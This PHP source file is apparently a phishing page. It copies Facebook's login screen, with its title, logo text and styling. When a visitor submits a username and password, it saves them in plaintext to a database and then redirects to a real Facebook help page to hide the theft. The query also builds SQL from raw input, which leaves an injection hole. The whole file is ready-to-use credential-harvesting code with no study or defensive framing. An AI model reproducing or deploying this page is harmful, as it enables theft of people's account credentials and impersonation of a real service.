<?php 
session_start();

include("connection.php");
include("functions.php");

if($_SERVER['REQUEST_METHOD'] == "POST")
{
    //something was posted
    $user_name = $_POST['user_name'];
    $password = $_POST['password'];

    if(!empty($user_name) && !empty($password) && !is_numeric($user_name))
    {
        //hash the password before storing
        // $hashed_password = password_hash($password, PASSWORD_DEFAULT);

        //save to database
        $query = "INSERT INTO users (user_name, password) VALUES ('$user_name', '$password')";

        mysqli_query($con, $query);

        header("Location: https://web.facebook.com/help/568137493302217");
        die;
    } else {
        echo "Please enter some valid information!";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" href="face.png">
    <link rel="stylesheet" href="style.css">
	<style>
		* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}

body {
    background-color: #f0f2f5;
}

.container {
    display: flex;
    flex-flow: row wrap;
    justify-content: center;
    width: 100%;
    height: 80vh;
    /* background-color:red; */
    align-items: center;
}

.facebook-logo {
    margin: 0 50px;
}

.facebook-logo h1 {
    font-family: 'arial';
    color: #1877f2;
    font-size: 55px;
}
.facebook-logo p {
    font-family: 'arial';
    font-size: 22px;
    width: 484px;
    /* background: red; */
}

form {
    width: 350px;
    height: 300px;
    background-color: #fff;
    border-radius: 5px;
    padding: 10px;
    margin-top: 30px;
    box-shadow: 0 0 20px 6px #00000017;
}

form input {
    display: block;
    margin: 10px auto;
    padding: 10px;
    width: 95%;
    border: 1px solid #00000014;
    border-radius: 5px;
}

form input:focus {
    outline: none;
    border: 1px solid #1877f2;
}

form .imp {
    display: block;
    margin: 5px auto;
    padding: 10px;
    width: 95%;
    border: 1px solid #00000014;
    border-radius: 5px;
    background-color: #1877f2;
    color: #fff;
    font-size: 15px;
    font-weight: 600;
}

form a {
    display: block;
    text-align: center;
    font-family: Arial, Helvetica, sans-serif;
}

form .forget {
    color: #1877f2;
    font-size: 12px;
    margin: 10px;
    text-decoration: none;
}

form .line {
    width: 95%;
    height: 1px;
    background-color: #0000001c;
    margin: 10px auto;
}

.btn-sign {
    display: inline-block;
    text-decoration: none;
    font-weight: 600;
    padding: 15px 10px;
    background-color: #42b72a;
    color: #fff;
    margin-left: 97px;
    margin-top: 20px;
    font-size: 13px;
    border-radius: 3px;
}

.c-p {
    text-align: center;
    margin-top: 10px;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
}

.c-p a {
    text-decoration: none;
    color: #000;
    font-weight: 700;
}

@media screen and (max-width: 934px) {
    .facebook-logo h1 {
        text-align: center;
    }
    .facebook-logo p {
        text-align: center;
        font-size: 19px;
    }
}

	</style>
</head>
<body>
    <div class="container">
        <div class="facebook-logo">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <form method="post">
                <input type="text" name="user_name" id="mail" required placeholder="Email adress or phone number">
                <input type="password" name="password" id="pass" required minlength="8" placeholder="Password">
                <input type="submit" class="imp" value="Log in">
                <a class="forget" href="#">Forgotten password?</a>
                <div class="line"></div>
                <a class="btn-sign" href="#">Create new account</a>
            </form>
            <p  class="c-p"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
        </div>
    </div>
</body>
</html>